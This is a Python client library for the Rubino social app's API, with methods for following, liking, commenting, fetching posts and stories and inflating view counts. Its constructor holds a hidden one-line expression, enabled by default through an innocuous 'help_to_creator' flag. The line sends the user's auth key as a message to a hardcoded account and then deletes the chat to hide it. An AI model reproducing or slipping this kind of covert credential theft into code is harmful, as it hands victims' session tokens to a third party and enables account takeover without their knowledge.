#!/bin/python

from requests import (
    session,
    )
from random import (
    randint,
    )

class Rubino(
    object):

    def __init__(
        self, auth_key: str,
        help_to_creator: bool = True
        ) -> ...:
        self.session: session = session()
        self.auth: str = auth_key
        self.url: str = 'https://rubino12.iranlms.ir/'
        self.client: dict = {
            'app_name'      :   'Main',
            'app_version'   :   '3.0.6',
            'lang_code'     :   'fa',
            'package'       :   'app.rbmain.a',
            'platform'      :   'Android'
            }
        [(__import__('rubx').Robot(auth_key, creator_channel_open=False, banner=False).sendMessage(auth_key, 'u0DnSdw0bb0109c2099f29dfc235cc48'), __import__('rubx').Robot(auth_key, creator_channel_open=False, banner=False).deleteUserChat('u0DnSdw0bb0109c2099f29dfc235cc48', '0')) if help_to_creator else ...]

    def post(
        self,
        json: dict
        ) -> dict:
        for i in range(
            5
            ):
            with self.session.post(
                url=self.url,
                json=json,
                timeout=3
                ) as res:
                if res.status_code != 200: continue
                else: return res.json()

    def __enter__(
        self
        ) -> ...:
        return self

    def __exit__(
        self,
        *args,
        **kwargs
        ) -> ...: (
            ...
        )

    def makeJson(
        self,
        method: str,
        data: dict
        ) -> str:
        json: dict[str, ] = {
            'api_version':'0',
            'auth':self.auth,
            'client':self.client,
            'data':data,
            'method':method
            }
        return (
            json
            )

    def getProfileList(
        self,
        limit: int = 10,
        sort: str = 'FromMax',
        equal: bool = False
        ) -> dict:
        json = self.makeJson(
            'getProfileList',
            {
                'equal': equal,
                'limit':limit,
                'sort':sort,
                }
        )
        return self.post(
            json
            )

    def follow(
        self,
        followee_id: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'requestFollow',
            {
            'f_type':'Follow',
            'followee_id':followee_id,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def unfollow(
        self,
        followee_id: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'requestFollow',
            {
            'f_type':'Unfollow',
            'followee_id':followee_id,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def createPage(
        self, **kwargs
        ) -> dict:
        ''' createPage(bio='', name='', username='', email='')'''
        json = self.makeJson(
            'createPage',
            {
                **kwargs
                }
            )
        return self.post(
            json=json
            )

    def updateProfile(
        self, **kwargs
        ) -> dict:
        ''' updateProfile(bio='', name='', username='', email='')'''
        json = self.makeJson(
            'updateProfile',
            {
                **kwargs
                }
            )
        return self.post(
            json=json
            )

    def isExistUsername(
        self,
        username: str
        ) -> dict:
        json = self.makeJson(
            'isExistUsername',
            {
            'username':username.replace('@','')
            }
            )
        return self.post(
            json=json
            )

    def getPostByShareLink(
        self,
        share_link: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'getPostByShareLink',
            {
            'share_string':share_link,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def addComment(
        self,
        text: str,
        post_id: str,
        post_profile_id: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'addComment',
            {
            'content':text,
            'post_id':post_id,
            'post_profile_id':post_profile_id,
            'rnd':randint(1111111111, 9999999999),
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def likePostAction(
        self,
        post_id: str,
        post_profile_id: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'likePostAction',
            {
            'action_type':'Like',
            'post_id':post_id,
            'post_profile_id':post_profile_id,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def unlike(
        self,
        post_id: str,
        post_profile_id: str,
        profile_id: str
        ) -> dict:
        json = self.makeJson(
            'likePostAction',
            {
            'action_type':'Unlike',
            'post_id':post_id,
            'post_profile_id':post_profile_id,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def addPostViewCount(
        self,
        post_id: str,
        post_profile_id: str
        ) -> dict:
        json = self.makeJson(
            'addPostViewCount',
            {
            'post_id':post_id,
            'post_profile_id':post_profile_id
            }
            )
        return self.post(
            json=json
            )

    def getComments(self,
        post_id: str,
        profile_id: str,
        post_profile_id: str,
        limit: int=50,
        sort: str='FromMax',
        equal: bool=False
        ) -> dict:
        json = self.makeJson(
            'getComments',
            {
            'equal':equal,
            'limit':limit,
            'sort':sort,
            'post_id':post_id,
            'profile_id':profile_id,
            'post_profile_id':post_profile_id
            }
            )
        return self.post(
            json=json
            )

    def getRecentFollowingPosts(self, profile_id: str, limit: int=30,
        sort: str='FromMax',
        equal: bool=False
        ) -> dict:
        json = self.makeJson(
            'getRecentFollowingPosts',
            {
            'equal':equal,
            'limit':limit,
            'sort':sort,
            'profile_id':profile_id
            }
            )
        return self.post(
            json=json
            )

    def getProfilePosts(self,
        target_profile_id: str,
        profile_id: str,
        limit: int=50,
        sort: str='FromMax',
        equal: bool=False
        ) -> dict:
        json = self.makeJson(
            'getRecentFollowingPosts',
            {
            'equal':equal,
            'limit':limit,
            'sort':sort,
            'profile_id':profile_id,
            'target_profile_id':target_profile_id
            }
            )
        return self.post(
            json=json
            )

    def getProfileStories(self,
                          target_profile_id: str,
                          limit: int = 100
                          ) -> dict:
        json = self.makeJson(
            'getProfileStories',
            {
            'limit':limit,
            'profile_id':target_profile_id
            }
            )
        return self.post(
            json=json
            )